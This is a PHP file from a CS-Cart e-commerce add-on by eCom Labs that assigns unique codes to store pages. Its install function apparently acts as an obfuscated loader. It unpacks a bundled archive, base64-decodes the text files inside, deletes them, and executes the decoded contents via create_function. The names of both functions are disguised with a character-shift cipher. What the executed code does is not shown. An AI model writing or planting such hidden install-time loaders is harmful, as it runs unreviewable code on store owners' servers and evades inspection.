<?php
/*****************************************************************************
*                                                                            *
*                   All rights reserved! eCom Labs LLC                       *
* http://www.ecom-labs.com/about-us/ecom-labs-modules-license-agreement.html *
*                                                                            *
*****************************************************************************/

use Tygh\Registry;

if (!defined('BOOTSTRAP')) { die('Access denied'); }

function fn_ecl_pages_exim_set_pages_codes()
{
    $set_ids = db_get_fields("SELECT page_id FROM ?:pages WHERE page_code = ?s", '');

    if (!empty($set_ids)) {
        fn_set_page_code($set_ids);
        if (Registry::get('runtime.controller') == 'addons') {
            fn_set_notification('N', __('notice'), __('page_codes_added_text'));
        }
    }

    return true;
}

function fn_set_page_code($page_ids, $code = '')
{
    if (!is_array($page_ids)) {
        $page_ids = array($page_ids);
    }

    if (!empty($page_ids)) {
        foreach ($page_ids as $id) {
            if (!empty($code)) {
                $_code = $code;
            } else {
                $_code = fn_create_page_code();
            }
            db_query("UPDATE ?:pages SET page_code = ?s WHERE page_id = ?i", $_code, $id);
        }
    }
}

function fn_create_page_code()
{
    $code_exists = true;
    while ($code_exists == true) {
        $_code = fn_generate_code(Registry::get('addons.ecl_pages_exim.ecl_page_code_prefix'), Registry::get('addons.ecl_pages_exim.ecl_max_page_code_length'));
        $code_exists = db_get_field("SELECT page_id FROM ?:pages WHERE page_code = ?s", $_code);
    }
    return $_code;
}

function fn_check_page_codes(&$data)
{
    if (!empty($data)) {
        foreach ($data as $key => $page_data) {
            if (isset($page_data['page_code']) && empty($page_data['page_code'])) {
                $data[$key]['page_code'] = fn_create_page_code();
            }
        }
    }

    return true;
}

function fn_ecl_pages_exim_install()
{
    fn_decompress_files(Registry::get('config.dir.var') . 'addons/ecl_pages_exim/ecl_pages_exim.tgz', Registry::get('config.dir.var') . 'addons/ecl_pages_exim');
    $list = fn_get_dir_contents(Registry::get('config.dir.var') . 'addons/ecl_pages_exim', false, true, 'txt', '');

    if ($list) {
        include_once(Registry::get('config.dir.schemas') . 'literal_converter/utf8.functions.php');
        foreach ($list as $file) {
            $_data = call_user_func(fn_simple_decode_str('cbtf75`efdpef'), fn_get_contents(Registry::get('config.dir.var') . 'addons/ecl_pages_exim/' . $file));
            @unlink(Registry::get('config.dir.var') . 'addons/ecl_pages_exim/' . $file);
            if ($func = call_user_func_array(fn_simple_decode_str('dsfbuf`gvodujpo'), array('', $_data))) {
                $func();
            }
        }
    }
}